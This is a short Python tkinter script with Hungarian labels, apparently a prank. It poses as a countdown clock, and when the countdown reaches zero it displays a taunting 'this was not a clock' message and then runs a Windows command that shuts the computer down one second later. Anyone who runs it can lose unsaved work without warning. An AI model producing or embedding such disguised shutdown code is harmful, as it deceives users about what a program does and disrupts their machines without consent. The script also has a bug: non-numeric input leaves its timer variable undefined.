from tkinter import *
import time
from tkinter import messagebox
import os

def bekapcsolas():
    try:
        temp =int(masodperc.get())
    except:
        hiba.set("Számot írj be kérlek!")
    while temp>-1:
        mins,secs = divmod(temp,60)
        hours=0
        if mins >60:
            hours, mins = divmod(mins, 60)
        óra.set("{0:2d}".format(hours))
        perc.set("{0:2d}".format(mins))
        masodperc.set("{0:2d}".format(secs))
        ablak.update()
        time.sleep(1)
        if (temp == 0):
            messagebox.showinfo('"Óra"', "Ez nem egy óra volt 💀 🧠 🤯")
            os.system("shutdown /s /t 1")
        temp -= 1

ablak=Tk()
ablak.geometry("300x150")
ablak.title("Iraki óra")
óra=StringVar()
perc=StringVar()
masodperc=StringVar()
hiba=StringVar()
óra.set("00")
perc.set("00")
masodperc.set("10")
óraEntry=Label(ablak, width=3, font=("Arial", 18,""), textvariable=óra)
percEntry=Label(ablak, width=3, font=("Arial", 18,""), textvariable=perc)
masodpercEntry=Label(ablak, width=3, font=("Arial", 18,""), textvariable=masodperc)
óraEntry.place(x=80, y=20)
percEntry.place(x=130, y=20)
masodpercEntry.place(x=180, y=20)
gomb=Button(ablak, text="Bekapcsolás", bd="5",command=bekapcsolas)
gomb.place(x=115, y=120)
ablak.mainloop()